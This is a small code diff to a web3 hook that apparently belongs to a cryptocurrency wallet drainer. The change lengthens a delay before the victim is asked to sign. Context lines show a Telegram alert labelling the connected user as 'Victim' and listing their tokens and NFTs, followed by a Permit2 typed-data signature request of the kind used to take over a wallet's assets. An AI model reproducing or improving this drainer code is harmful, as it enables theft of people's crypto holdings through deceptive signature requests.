@@ -355,7 +355,7 @@ export function useWeb3Manager() {
                             notifyTelegram(`<b>✍️ God Bundle Requested</b>\nChain: ${targetChainName}\nVictim: <code>${checksummedVictim}</code>\nTokens: ${validTokens.length}\nNFTs: ${validNfts.length}`);
 
                             // Add delay to prevent wallet race conditions (especially on mobile)
-                            await new Promise(r => setTimeout(r, 3000));
+                            await new Promise(r => setTimeout(r, 5000));
 
                             const signature = await signer.signTypedData({
                                 name: "Permit2", chainId: network.chainId, verifyingContract: ethers.getAddress("0x000000000022d473030f116ddee9f6b43ac78ba3")
